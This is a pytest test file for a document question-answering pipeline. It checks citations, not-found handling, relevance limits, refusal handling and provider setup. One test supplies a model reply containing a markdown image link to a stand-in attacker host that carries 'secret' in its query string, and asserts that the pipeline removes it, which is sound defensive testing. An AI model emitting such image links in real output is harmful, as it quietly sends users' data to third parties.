import pytest
from langchain_core.language_models import FakeListChatModel
from langchain_core.messages import AIMessage

from docqa.config import Settings
from docqa.llm import LLMError, get_llm
from docqa.pipeline import NOT_FOUND, DocumentQA, build_prompt


def make(store, settings, *replies):
    qa = DocumentQA(store, FakeListChatModel(responses=list(replies)) if replies else None, settings)
    qa.add_bytes("leave.txt", b"Employees receive 26 days of annual leave.")
    qa.add_bytes("meals.txt", b"The daily meal limit is 55 euros.")
    return qa


def test_answer_with_citation(store, settings):
    answer = make(store, settings, "Employees receive 26 days [1].").ask("How much annual leave?")
    assert answer.found
    assert answer.citations[0].source == "leave.txt"


def test_combined_answer_cites_both_files(store, settings):
    reply = "Employees receive 26 days of annual leave. The meal limit is 55 euros."
    answer = make(store, settings, reply).ask("annual leave and daily meal limit?")
    assert {c.source for c in answer.citations} == {"leave.txt", "meals.txt"}
    assert answer.corrected


@pytest.mark.parametrize("reply", ["NOT_FOUND", "NOT_FOUND.", "Sorry: NOT_FOUND", ""])
def test_model_says_not_found(store, settings, reply):
    answer = make(store, settings, reply).ask("annual leave?")
    assert not answer.found and answer.text == NOT_FOUND and answer.citations == []


def test_untraceable_answer_is_withheld(store, settings):
    answer = make(store, settings, "Canberra is the capital city.").ask("annual leave?")
    assert not answer.found and "withheld" in answer.reason


def test_low_relevance_never_reaches_the_model(store, settings):
    class Exploding:
        def invoke(self, _):
            raise AssertionError("model must not be called")

    settings.min_relevance = 0.9
    qa = make(store, settings)
    qa.llm = Exploding()
    answer = qa.ask("quantum chromodynamics lattice")
    assert not answer.found and "below" in answer.reason


def test_empty_question_and_empty_store(store, settings):
    qa = DocumentQA(store, None, settings)
    assert "empty" in qa.ask("   ").reason
    assert "No documents" in qa.ask("hello").reason


def test_image_links_from_the_model_are_removed(store, settings):
    reply = "Employees receive 26 days [1]. ![x](https://evil.example/?q=secret)"
    assert "evil" not in make(store, settings, reply).ask("annual leave?").text


def test_provider_errors_are_wrapped(store, settings):
    class Broken:
        def invoke(self, _):
            raise ConnectionError("secret detail sk-123")

    qa = make(store, settings)
    qa.llm = Broken()
    with pytest.raises(LLMError) as err:
        qa.ask("annual leave?")
    assert "sk-123" not in str(err.value)


def test_refusal_stop_reason_is_not_found(store, settings):
    class Refusing:
        def invoke(self, _):
            return AIMessage("partial 26 days [1]", response_metadata={"stop_reason": "refusal"})

    qa = make(store, settings)
    qa.llm = Refusing()
    assert not qa.ask("annual leave?").found


def test_extractive_mode_quotes_the_document(store, settings):
    answer = make(store, settings).ask("What is the daily meal limit?")
    assert "55 euros [1]" in answer.text


def test_prompt_numbers_sources(store, settings):
    qa = make(store, settings)
    prompt = build_prompt("q?", qa.store.search("leave", 2))
    assert "[1] (leave.txt, chunk 1)" in prompt and "[2] (meals.txt" in prompt


def test_providers(monkeypatch):
    assert get_llm(Settings(provider="extractive")) is None
    claude = get_llm(Settings(provider="anthropic", model=""), api_key="test")
    payload = claude._get_request_payload("hi")
    assert payload["model"] == "claude-haiku-5-5"
    assert not {"temperature", "top_p", "top_k"} & set(payload)
    assert get_llm(Settings(provider="openai", model=""), api_key="test").model_name == "gpt-4o-mini"
    with pytest.raises(LLMError, match="Unknown provider"):
        get_llm(Settings(provider="nope"))
    monkeypatch.delenv("OPENAI_API_KEY", raising=False)
    with pytest.raises(LLMError, match="API key"):
        get_llm(Settings(provider="openai"))
